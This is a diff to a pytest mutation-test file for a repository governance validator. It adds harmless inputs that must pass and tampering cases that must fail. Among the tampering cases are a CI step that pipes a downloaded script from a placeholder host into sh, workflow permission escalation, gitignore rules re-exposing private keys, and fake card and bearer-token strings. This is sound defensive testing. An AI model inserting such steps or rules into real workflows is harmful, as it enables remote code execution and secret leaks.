@@ -122,7 +122,132 @@ HARMLESS: dict[str, Mutation] = {
     "CI run id (11 digits) is not flagged": lambda root: write(
         root, "docs/n2.md", "run 37957596129 ok\n"
     ),
+    "13-digit millisecond timestamp is not flagged": lambda root: write(
+        root, "docs/n3.md", "at 1760000000000 ms\n"
+    ),
+    "hyphenated prose after Bearer is not flagged": lambda root: write(
+        root, "docs/n4.md", "Bearer authentication-scheme-description follows\n"
+    ),
+    ".env.example stays trackable and not ignored": lambda root: write(
+        root, "docs/n5.md", "see .env.example\n"
+    ),
 }
+
+# Cases from the independent re-verification of the first hardening: the previous checks passed all
+# of these. The workflow is protected by a whole-file digest, so every edit below must fail.
+WORKFLOW_EDITS: dict[str, Mutation] = {
+    "workflow gains an extra permission": replace(
+        WF, "  contents: read\n", "  contents: read\n  issues: write\n"
+    ),
+    "workflow job-level write-all": replace(
+        WF,
+        "    runs-on: ubuntu-latest\n",
+        "    runs-on: ubuntu-latest\n    permissions: write-all\n",
+    ),
+    "workflow step disabled by a condition": replace(
+        WF,
+        "        run: python3 scripts/validate_governance.py",
+        "        if: false\n        run: python3 scripts/validate_governance.py",
+    ),
+    "workflow gains a download-and-run step": replace(
+        WF,
+        "        run: pytest -q",
+        "        run: pytest -q\n      - run: curl https://example.invalid/x.sh | sh",
+    ),
+    "workflow action in flow style": replace(
+        WF,
+        "      - name: Check out exact revision\n        uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5\n",
+        "      - {uses: actions/checkout@v5}\n",
+    ),
+    "workflow trigger changed to a branch that never exists": replace(
+        WF, "    branches: [main]", "    branches: [nonexistent]"
+    ),
+    "workflow validator step moved out of its job": replace(
+        WF,
+        "      - name: Validate TASK-01 governance and repository safety\n        run: python3 scripts/validate_governance.py\n",
+        "",
+    ),
+}
+GITIGNORE_EDITS: dict[str, Mutation] = {
+    "gitignore re-includes private keys": lambda root: edit(
+        root, ".gitignore", lambda text: text + "!*.pem\n"
+    ),
+    "gitignore re-includes everything": lambda root: edit(
+        root, ".gitignore", lambda text: text + "!*\n"
+    ),
+    "nested gitignore re-includes keys": lambda root: write(
+        root, "src/.gitignore", "!*.pem\n"
+    ),
+    "gitignore pattern with leading spaces": lambda root: edit(
+        root, ".gitignore", lambda text: text.replace("\n*.pem\n", "\n  *.pem\n", 1)
+    ),
+    "gitignore hides the example file the repo needs": lambda root: edit(
+        root, ".gitignore", lambda text: text.replace("!.env.example\n", "", 1)
+    ),
+}
+DOCUMENT_EDITS: dict[str, Mutation] = {
+    "template field only inside an HTML comment": replace(
+        PR, "- Full gates:\n", "<!-- - Full gates: -->\n"
+    ),
+    "template heading only inside an HTML comment": replace(
+        PR, "## Merge checklist\n", "<!-- ## Merge checklist -->\n"
+    ),
+    "template field only inside a code fence": replace(
+        PR, "- Full gates:\n", "```\n- Full gates:\n```\n"
+    ),
+    "policy heading moved into a comment": replace(
+        POL, "## Findings and severity\n", "<!-- ## Findings and severity -->\n"
+    ),
+    "policy severity definition deleted": replace(
+        POL,
+        "- **Major:** required behavior, control, or evidence is missing or materially inconsistent.\n",
+        "",
+    ),
+    "policy lifecycle row deleted": replace(
+        POL,
+        "| Verified | Required independent tests and gates passed against the named immutable revision. |\n",
+        "",
+    ),
+    "policy single-maintainer statement removed": replace(
+        POL, "single maintainer", "team of maintainers"
+    ),
+    "policy Cursor controls removed": lambda root: edit(
+        root, POL, lambda text: text.replace("Cursor", "Editor")
+    ),
+    "work-item status duplicated": lambda root: edit(
+        root,
+        "docs/work-items/TASK-01.md",
+        lambda text: text.replace(
+            "**Status:** Implemented",
+            "**Status:** Implemented\n**Status:** Verified",
+            1,
+        ),
+    ),
+    "work-item status unbolded": lambda root: edit(
+        root,
+        "docs/work-items/TASK-01.md",
+        lambda text: text.replace("**Status:** Implemented", "Status: Implemented", 1),
+    ),
+    "work-item template GAP sentence weakened": replace(
+        WI, "becomes GAP-nnnn and pauses", "becomes a note and may pause"
+    ),
+}
+SECRET_FORMS: dict[str, Mutation] = {
+    "card number written with spaces": lambda root: write(
+        root,
+        "docs/c1.md",
+        "card " + " ".join(["4111", "1111", "1111", "1111"]) + " here\n",  # noqa: FLY002 (a literal here would trip the card scan)
+    ),
+    "card number written with dashes": lambda root: write(
+        root,
+        "docs/c2.md",
+        "card " + "-".join(["4111", "1111", "1111", "1111"]) + " here\n",  # noqa: FLY002
+    ),
+    "bearer token with digits": lambda root: write(
+        root, "docs/c3.md", "Authorization: Bear" + "er abcdefghij0123456789xyz\n"
+    ),
+}
+MUTATIONS.update(WORKFLOW_EDITS | GITIGNORE_EDITS | DOCUMENT_EDITS | SECRET_FORMS)
 
 
 @pytest.fixture(scope="module")
